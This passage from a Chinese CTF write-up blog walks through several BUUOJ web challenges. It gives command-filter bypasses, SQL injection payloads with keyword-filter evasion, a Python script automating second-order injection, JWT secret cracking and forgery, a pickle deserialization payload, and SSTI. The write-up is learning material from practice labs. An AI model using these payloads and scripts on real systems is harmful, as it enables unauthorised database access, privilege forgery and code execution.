class="symbol">%a0</span><span class="symbol">%d1</span><span class="symbol">%d5</span><span class="symbol">%5</span>d<span class="symbol">%83</span><span class="symbol">%60</span><span class="symbol">%fb</span><span class="symbol">%5</span>f<span class="symbol">%07</span><span class="symbol">%fe</span><span class="symbol">%a2</span></span><br></pre></td></tr></table></figure>

<p>碰撞通过后，这里对命令进行了过滤，这里有两种解法</p>
<h2 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h2><p>Linux sort命令用于将文本文件内容加以排序。</p>
<p>sort可针对文本文件的内容，以行为单位来排序。</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215205545.png" alt=""></p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215205606.png" alt=""></p>
<h2 id="过滤不严"><a href="#过滤不严" class="headerlink" title="\过滤不严"></a>\过滤不严</h2><p>linux下在<code>shell</code>中可通过<code>ca\t</code>的形式连接命令</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215205936.png" alt=""></p>
<p>而<code>\</code>不在那个过滤中，成功绕过</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215210012.png" alt=""></p>
<h2 id="tar压缩绕过"><a href="#tar压缩绕过" class="headerlink" title="tar压缩绕过"></a>tar压缩绕过</h2><p>这里正则里没过滤<code>tar</code>，但是过滤了<code>-</code>，但不影响参数的使用</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">/index.php?cmd=tar%<span class="number">20</span>zcvf%<span class="number">20</span>a.tar.gz%<span class="number">20</span>/flag</span><br></pre></td></tr></table></figure>

<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200216142425.png" alt=""></p>
<p>然后访问<code>/a.tar.gz</code>下载得到<code>flag</code>压缩包解压得到<code>flag</code></p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200216142400.png" alt=""></p>
<h1 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h1><p>还是羽哥哥出的注入题</p>
<p>先放到<code>Sqlmap</code>看了一下</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200216151024.png" alt=""></p>
<h2 id="PROCEDURE-ANALYSE注入"><a href="#PROCEDURE-ANALYSE注入" class="headerlink" title="PROCEDURE ANALYSE注入"></a>PROCEDURE ANALYSE注入</h2><p>可能存在<code>PROCEDURE ANALYSE</code>注入</p>
<p><a href="https://www.freebuf.com/column/150475.html" target="_blank" rel="noopener">CTF中的SQL注入 | 常规获取数据类</a></p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200216151514.png" alt=""></p>
<p><a href="https://www.cnblogs.com/peterpan0707007/p/7536126.html" target="_blank" rel="noopener">【总结】MYSQL注入</a></p>
<p><a href="https://www.freebuf.com/articles/web/57528.html" target="_blank" rel="noopener">技术分享：Mysql注入点在limit关键字后面的利用方法</a></p>
<p><a href="https://blog.csdn.net/ty_hf/article/details/54895466" target="_blank" rel="noopener">Mysql优化-Procedure_Analyse优化表结构</a></p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">http://<span class="number">9498</span>b5e3-<span class="number">3005</span>-<span class="number">4623</span>-ab8e-<span class="number">2</span>b58b325b780.node3.buuoj.cn/check.php?username=<span class="number">1</span>' <span class="keyword">PROCEDURE</span> <span class="title">ANALYSE</span>(EXTRACTVALUE(1,CONCAT(0x7e,database())),1)<span class="comment">-- -&amp;password=1</span></span><br></pre></td></tr></table></figure>

<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200216151717.png" alt=""></p>
<p>得到数据库名，证明注入可行</p>
<p><strong>以上提供思路，剩下的我大半天也没注出表名……</strong></p>
<h2 id="正常报错注入"><a href="#正常报错注入" class="headerlink" title="正常报错注入"></a>正常报错注入</h2><p>这里把关键字全部单次过滤了，双写绕过即可</p>
<h3 id="爆库名"><a href="#爆库名" class="headerlink" title="爆库名"></a>爆库名</h3><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">/check.php?username=<span class="number">1</span>'anandd updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(selselectect database()),<span class="number">0x7e</span>),<span class="number">1</span>)-- -&amp;password=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200216163936.png" alt=""></p>
<h3 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h3><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">/check.php?username=<span class="number">1</span>'anandd updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(seselectlect group_concat(table_name) frofromm infoorrmation_schema.tables whwhereere table_schema=database()),<span class="number">0x7e</span>),<span class="number">1</span>)-- -&amp;password=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200216164047.png" alt=""></p>
<h3 id="爆字段名"><a href="#爆字段名" class="headerlink" title="爆字段名"></a>爆字段名</h3><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">/check.php?username=<span class="number">1</span>'anandd updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(seselectlect group_concat(column_name) frofromm infoorrmation_schema.columns whwhereere table_schema=database()),<span class="number">0x7e</span>),<span class="number">1</span>)-- -&amp;password=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200216164233.png" alt=""></p>
<p>经过测试得知<code>falg</code>在<code>password</code>字段</p>
<h3 id="爆flag"><a href="#爆flag" class="headerlink" title="爆flag"></a>爆<code>flag</code></h3><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">/check.php?username=<span class="number">1</span>'anandd updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(left((seselectlect passwoorrd frfromom geek.b4bsql limit <span class="number">7</span>,<span class="number">1</span>),<span class="number">31</span>)),<span class="number">0x7e</span>),<span class="number">1</span>)-- -&amp;password=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200216170026.png" alt=""></p>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">http://<span class="number">9498b5e3</span>-<span class="number">3005-4623</span>-ab8e-<span class="number">2</span>b58b<span class="number">325b780</span>.node3.buuoj.cn/check.php?username=<span class="number">1</span>'anandd updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(right((seselectlect passwoorrd frfromom geek.b4bsql limit <span class="number">7</span>,<span class="number">1</span>),<span class="number">31</span>)),<span class="number">0</span>x7e),<span class="number">1</span>)-- -&amp;password=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>得到后半段</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200216170151.png" alt=""></p>
<p>组合一下得到<code>flag</code></p>
<h1 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h1><p>这道题我看到用户名一开始以为是用户名二次注入</p>
<p>测试了半天发现不是</p>
<p>最后发现注入点是在广告申请处的标题那里</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200216203323.png" alt=""></p>
<p>申请完之后在广告详情处可以看到触发注入结果了（这也算是二次注入？？</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200216203440.png" alt=""></p>
<p>那么这里可以在广告申请这里来进行注入，为了方便，写了个脚本辅助注入</p>
<p>比较坑爹的是<code>payload</code>即广告内容不能重复，即一个payload只能用一次。。。</p>
<p>这里附上辅助脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">session = requests.session()</span><br><span class="line">all_url = <span class="string">"http://4e4b49d5-0057-4ae6-b34e-71e0575d34d2.node3.buuoj.cn/"</span></span><br><span class="line">register_url = all_url+<span class="string">"register.php"</span></span><br><span class="line">login_url = all_url+<span class="string">"login.php"</span></span><br><span class="line">ad_url = all_url+<span class="string">"addads.php"</span></span><br><span class="line">index_url = all_url+<span class="string">"index.php"</span></span><br><span class="line">user = str(random.random())</span><br><span class="line">register_data = &#123;</span><br><span class="line">	<span class="string">'username'</span>: user,</span><br><span class="line">	<span class="string">'password'</span>: <span class="string">'qwer1234'</span>,</span><br><span class="line">	<span class="string">'ac'</span>: <span class="string">'register'</span></span><br><span class="line">&#125;</span><br><span class="line">session.post(url=register_url,data=register_data)</span><br><span class="line">login_data = &#123;</span><br><span class="line">	<span class="string">'username'</span>: user,</span><br><span class="line">	<span class="string">'password'</span>: <span class="string">'qwer1234'</span>,</span><br><span class="line">	<span class="string">'ac'</span>: <span class="string">'login'</span></span><br><span class="line">&#125;</span><br><span class="line">session.post(url=login_url,data=login_data)</span><br><span class="line"><span class="keyword">for</span> id <span class="keyword">in</span> range(<span class="number">18</span>,<span class="number">99999</span>):</span><br><span class="line">	payload = input(<span class="string">"Payload:"</span>)</span><br><span class="line">	preg_0 = re.compile(<span class="string">"待管理确认&lt;/td&gt;&lt;td&gt;&lt;button type='button'&gt;&lt;a href='(.*?)'&gt;"</span>)</span><br><span class="line">	ad_data = &#123;</span><br><span class="line">		<span class="string">'title'</span>: payload,</span><br><span class="line">		<span class="string">'content'</span>: <span class="string">'3213'</span>,</span><br><span class="line">		<span class="string">'ac'</span>: <span class="string">'add'</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		state = session.post(url=ad_url,data=ad_data).text</span><br><span class="line">		print(<span class="string">"申请状态:"</span>+state)</span><br><span class="line">		index = session.get(url=index_url).text</span><br><span class="line">		detail_url = all_url+preg_0.findall(index)[<span class="number">-1</span>]</span><br><span class="line">		s = session.get(url=detail_url).text</span><br><span class="line">		preg_1 = re.compile(<span class="string">"&lt;tr&gt;&lt;td&gt;(.*?)&lt;/td&gt;&lt;td&gt;"</span>)</span><br><span class="line">		show = preg_1.findall(s)[<span class="number">0</span>]</span><br><span class="line">		print(<span class="string">"回显:"</span>+show)</span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">		print(e)</span><br><span class="line">		<span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>通过这个脚本可以看到过滤了<code>空格、or、floor、updatexml、extractvalue、exp</code>等字符</p>
<p>空格过滤可通过<code>/**/</code>绕过</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200216204023.png" alt=""></p>
<p>过滤了<code>or</code>就不能从<code>information_schema</code>表查到信息了，可以依靠子查询</p>
<p>判断回显点可以通过<code>union/**/select1,2,3,4,5.......</code>来不断尝试</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>'union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>'<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200216204803.png" alt=""></p>
<p>然后得到数据库名</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>'union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,database(),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>'<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200216204904.png" alt=""></p>
<p>既然不能用<code>information_schema</code>库来查表名列名，那么只能用子查询了</p>
<p>这里修改了一下脚本，自己在<code>2</code>号注入点修改数据即可</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">"-1'union/**/select/**/1,&#123;&#125;,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'&#123;&#125;"</span>.<span class="built_in">format</span>(<span class="built_in">input</span>(<span class="string">"Payload:"</span>),str(<span class="built_in">random</span>.<span class="built_in">random</span>()))</span><br></pre></td></tr></table></figure>

<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200216205651.png" alt=""></p>
<p>接下来是获取表名</p>
<p>师傅们的做法中用到了<code>sys.schema_auto_increment_columns</code>来获取表名</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217130521.png" alt=""></p>
<p>但这道题好像没有<code>sys.schema_auto_increment_columns</code>这个表</p>
<p>还有这个表也可以<code>schema_index_statistics</code>，但这道题用不了哈哈</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217130755.png" alt=""></p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217131754.png" alt=""></p>
<p>最后找到<code>mysql.innodb_index_stats</code>表</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217134025.png" alt=""></p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>'union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,(select<span class="comment">/**/</span>group_concat(table_name)<span class="comment">/**/</span>from<span class="comment">/**/</span>mysql.innodb_index_stats<span class="comment">/**/</span>where<span class="comment">/**/</span>database_name=schema()),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span><span class="comment">/**/</span>'<span class="number">0.6139996297990679</span></span><br></pre></td></tr></table></figure>

<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217134107.png" alt=""></p>
<p>得到了表名<code>users</code>，但列名没法查出来，只能无列名注入了</p>
<p>经过测试得到<code>users</code>有三个列</p>
<p>然后老套路子查询注入</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217135801.png" alt=""></p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>'union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,(select<span class="comment">/**/</span>`<span class="number">3</span>`<span class="comment">/**/</span>from<span class="comment">/**/</span>(select<span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span>*<span class="comment">/**/</span>from<span class="comment">/**/</span>users)a<span class="comment">/**/</span>limit<span class="comment">/**/</span><span class="number">1</span>,<span class="number">1</span>),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span><span class="comment">/**/</span>'<span class="number">0.4236117591863676</span></span><br></pre></td></tr></table></figure>

<p>上面为查询<code>flag</code>语句</p>
<p>最后附上我的脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">session = requests.session()</span><br><span class="line">all_url = <span class="string">"http://09ccff60-a99c-4fe8-bc1e-a95e62c7826b.node3.buuoj.cn/"</span></span><br><span class="line">register_url = all_url+<span class="string">"register.php"</span></span><br><span class="line">login_url = all_url+<span class="string">"login.php"</span></span><br><span class="line">ad_url = all_url+<span class="string">"addads.php"</span></span><br><span class="line">index_url = all_url+<span class="string">"index.php"</span></span><br><span class="line">user = str(random.random())</span><br><span class="line">register_data = &#123;</span><br><span class="line">	<span class="string">'username'</span>: user,</span><br><span class="line">	<span class="string">'password'</span>: <span class="string">'qwer1234'</span>,</span><br><span class="line">	<span class="string">'ac'</span>: <span class="string">'register'</span></span><br><span class="line">&#125;</span><br><span class="line">session.post(url=register_url,data=register_data)</span><br><span class="line">login_data = &#123;</span><br><span class="line">	<span class="string">'username'</span>: user,</span><br><span class="line">	<span class="string">'password'</span>: <span class="string">'qwer1234'</span>,</span><br><span class="line">	<span class="string">'ac'</span>: <span class="string">'login'</span></span><br><span class="line">&#125;</span><br><span class="line">session.post(url=login_url,data=login_data)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	payload = <span class="string">"-1'union/**/select/**/1,&#123;&#125;,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#123;&#125;'&#123;&#125;"</span>.format(input(<span class="string">"Payload[1]:"</span>),input(<span class="string">"Payload[2]:"</span>),str(random.random())).replace(<span class="string">" "</span>,<span class="string">"/**/"</span>)</span><br><span class="line">	print(payload)</span><br><span class="line">	preg_0 = re.compile(<span class="string">"待管理确认&lt;/td&gt;&lt;td&gt;&lt;button type='button'&gt;&lt;a href='(.*?)'&gt;"</span>)</span><br><span class="line">	ad_data = &#123;</span><br><span class="line">		<span class="string">'title'</span>: payload,</span><br><span class="line">		<span class="string">'content'</span>: <span class="string">'3213'</span>,</span><br><span class="line">		<span class="string">'ac'</span>: <span class="string">'add'</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		state = session.post(url=ad_url,data=ad_data).text</span><br><span class="line">		print(<span class="string">"申请状态:"</span>+state)</span><br><span class="line">		index = session.get(url=index_url).text</span><br><span class="line">		detail_url = all_url+preg_0.findall(index)[<span class="number">-1</span>]</span><br><span class="line">		s = session.get(url=detail_url).text</span><br><span class="line">		preg_1 = re.compile(<span class="string">"&lt;tr&gt;&lt;td&gt;(.*?)&lt;/td&gt;&lt;td&gt;"</span>)</span><br><span class="line">		error_preg = re.compile(<span class="string">"&lt;font color='red'&gt;(.*?)&lt;/font&gt;"</span>)</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			error = error_preg.findall(s)[<span class="number">0</span>]</span><br><span class="line">			print(<span class="string">"捕捉错误:"</span>+error)</span><br><span class="line">		<span class="keyword">except</span>:</span><br><span class="line">			<span class="keyword">pass</span></span><br><span class="line">		show = preg_1.findall(s)[<span class="number">0</span>]</span><br><span class="line">		print(<span class="string">"回显:"</span>+show)</span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">		print(e)</span><br><span class="line">		<span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<h1 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h1><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217162758.png" alt=""></p>
<p>打开看到注释，提示到编码<code>UTF-8</code>并且题目名字和<code>Unicode</code>有关</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217163007.png" alt=""></p>
<p>买1、2、3号商品，会提示</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217163107.png" alt=""></p>
<p>买4号商品，输入个位数会提示钱不够</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217163128.png" alt=""></p>
<p>输入1337会提示只能输入一个字符</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217163203.png" alt=""></p>
<p>不输入价格直接提交会爆错</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217163254.png" alt=""></p>
<p>这里采用了<code>numeric</code>函数，得到输入值的的<code>numeric value</code></p>
<p>那么能不能找到一个<code>Unicode</code>，让他的<code>numeric value</code>大于<code>1337</code>即可</p>
<p><a href="https://www.compart.com/en/unicode/search?q=ten+thousand#characters" target="_blank" rel="noopener">https://www.compart.com/en/unicode/search?q=ten+thousand#characters</a></p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217164220.png" alt=""></p>
<p>直接提交这个字符即可</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217164404.png" alt=""></p>
<p>很有趣的编码题</p>
<p>相关链接：</p>
<p><a href="https://xz.aliyun.com/t/5402" target="_blank" rel="noopener">浅谈Unicode设计的安全性</a></p>
<h1 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h1><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217170821.png" alt=""></p>
<p>提示要买到<code>LV6</code>，但这里翻了几页没找到了<code>LV6</code>，而且使用<code>requests</code>库会出现<code>403</code>问题</p>
<p>这里直接用<code>selenium</code>来找</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"></span><br><span class="line">chrome_opt = Options()</span><br><span class="line">chrome_opt.add_argument(<span class="string">'--headless'</span>)</span><br><span class="line">chrome_opt.add_argument(<span class="string">'--disable-gpu'</span>)</span><br><span class="line">driver = webdriver.Chrome(chrome_options=chrome_opt)</span><br><span class="line"><span class="keyword">for</span> id <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9999</span>):</span><br><span class="line">    print(id)</span><br><span class="line">    url = <span class="string">"http://365191b5-4640-4366-9d70-ab92268e6a31.node3.buuoj.cn/shop?page=&#123;&#125;"</span>.format(id)</span><br><span class="line">    driver.get(url)</span><br><span class="line">    content = driver.page_source</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"/static/img/lv/lv6.png"</span> <span class="keyword">in</span> content:</span><br><span class="line">        print(url)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217170942.png" alt=""></p>
<p>最后找到在<code>181</code>页</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217171048.png" alt=""></p>
<p>但好像比较贵，注册的新账号只有1000块钱</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217171035.png" alt=""></p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217171148.png" alt=""></p>
<p>这里购买的时候抓包一下</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217171225.png" alt=""></p>
<p>这个应该就是折扣，我们修改成0.000000001</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217171300.png" alt=""></p>
<p>然后发过去发现页面只容许<code>admin</code>访问….</p>
<p>但这里看到存在<code>JWT</code></p>
<p>先把自己的解密一下看看</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217171608.png" alt=""></p>
<p>剩下的部分由于存在秘钥，所以看不到，得解密</p>
<p><a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">c-jwt-cracker</a></p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217173840.png" alt=""></p>
<p>解密得到秘钥<code>1Kun</code></p>
<p>伪造得到<code>admin</code>的<code>JWT</code></p>
<p><a href="https://jwt.io/" target="_blank" rel="noopener">https://jwt.io/</a></p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217174039.png" alt=""></p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217174230.png" alt=""></p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217174431.png" alt=""></p>
<p>得修改两次</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217174652.png" alt=""></p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217174639.png" alt=""></p>
<p>查看<code>HTML源码</code>得到源代码</p>
<p>在<code>Admin.py</code>文件中存在<code>pickle</code>反序列化漏洞</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217175404.png" alt=""></p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217181738.png" alt=""></p>
<p>这里最重要一点是，反序列化需要反序列化那个文件中存在那个库，这样才能调用，否则是不可以的</p>
<p>因此上面那个<code>payload</code>在远程是大不了的</p>
<p>而且反序列化需要用<code>python2</code>来运行，用<code>python3</code>运行的结果不一样，传过去也没效果<br>这里采用<code>__reduce__</code>第二中方式</p>
<p>第一个参数传入一个可被调用的方法，</p>
<p>第二个参数传入可被第一个参数调用的参数，所以这里实际上执行的是:</p>
<p><code>eval(&quot;open(&#39;/flag.txt&#39;,&#39;r&#39;).read()&quot;)</code></p>
<p>最终的<code>payload</code>为:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span><span class="params">(object)</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">		<span class="keyword">return</span> (eval, (<span class="string">"open('/flag.txt','r').read()"</span>,))</span><br><span class="line"></span><br><span class="line">aa = payload()</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">s = pickle.loads(a)</span><br><span class="line">print(a)</span><br><span class="line">print(urllib.quote(a))</span><br></pre></td></tr></table></figure>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217182951.png" alt=""></p>
<p>把运行结果传入<code>become</code>参数，即可得到<code>flag</code></p>
<h1 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h1><p>打开界面得到源代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> flask </span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line">app = flask.Flask(__name__) </span><br><span class="line">app.config[<span class="string">'FLAG'</span>] = os.environ.pop(<span class="string">'FLAG'</span>) </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/') </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span> </span><br><span class="line">    <span class="keyword">return</span> open(__file__).read() </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/shrine/') </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span><span class="params">(shrine)</span>:</span> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span><span class="params">(s)</span>:</span> </span><br><span class="line">        s = s.replace(<span class="string">'('</span>, <span class="string">''</span>).replace(<span class="string">')'</span>, <span class="string">''</span>) </span><br><span class="line">        blacklist = [<span class="string">'config'</span>, <span class="string">'self'</span>] </span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s </span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine)) </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>: app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>又是模板注入<code>SSTI</code></p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">SSTI目的无非就是两个：文件读写、getshell。因此我们核心应该放在<span class="built_in">file</span>类和os类</span><br></pre></td></tr></table></figure>

<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217200408.png" alt=""></p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200217183709.png" alt=""></p>
<p>这道题过滤了括号，这种没做过，找到<code>writeup</code>学习了一下</p>
<p><a href="https://ctftime.org/writeup/10895" target="_blank" rel="noopener">https://ctftime.org/writeup/10895</a></p>
